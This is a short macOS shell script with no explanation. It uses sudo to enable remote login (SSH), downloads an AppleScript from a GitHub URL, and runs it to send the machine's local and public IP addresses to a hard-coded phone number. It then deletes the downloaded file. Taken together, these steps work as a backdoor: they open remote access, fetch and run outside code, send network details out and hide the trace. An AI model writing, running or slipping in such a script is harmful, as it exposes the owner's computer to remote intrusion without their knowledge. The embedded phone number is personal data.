#!/bin/sh
sudo systemsetup -f -setremotelogin on
wget https://raw.githubusercontent.com/fscty/code_/master/temp/send.scpt
osascript send.scpt +33783549426 $(ipconfig getifaddr en0)
osascript send.scpt +33783549426 $(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')
osascript send.scpt +33783549426 $(ifconfig | grep inet | cut -c7-20)
rm send.scpt
